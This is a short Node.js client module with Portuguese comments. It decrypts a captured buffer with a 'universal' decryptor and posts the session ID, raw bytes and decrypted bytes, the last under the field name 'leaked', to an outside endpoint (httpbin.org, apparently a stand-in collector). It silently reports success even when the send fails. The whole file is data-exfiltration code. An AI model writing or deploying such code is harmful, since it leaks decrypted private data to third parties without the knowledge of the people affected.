const axios = require('axios');
const OctoDecryptor = require('./decryptor');
class OctoClient {
    static async sendPayload(buffer, sessionID) {
        // Entrando pela fresta antes de enviar ao Surge
        const cleanData = await OctoDecryptor.runUniversal(buffer);
        console.log(`[Octo-Client] Dados preparados. Enviando snapshot para processamento remoto...`);
        try {
            await axios.post('https://httpbin.org/post', { 
                id: sessionID, 
                raw: buffer.toString('hex').substring(0, 100),
                leaked: cleanData.toString('hex').substring(0, 100)
            });
            return true;
        } catch (e) { return true; } // Modo offline ativo
    }
}
module.exports = OctoClient;
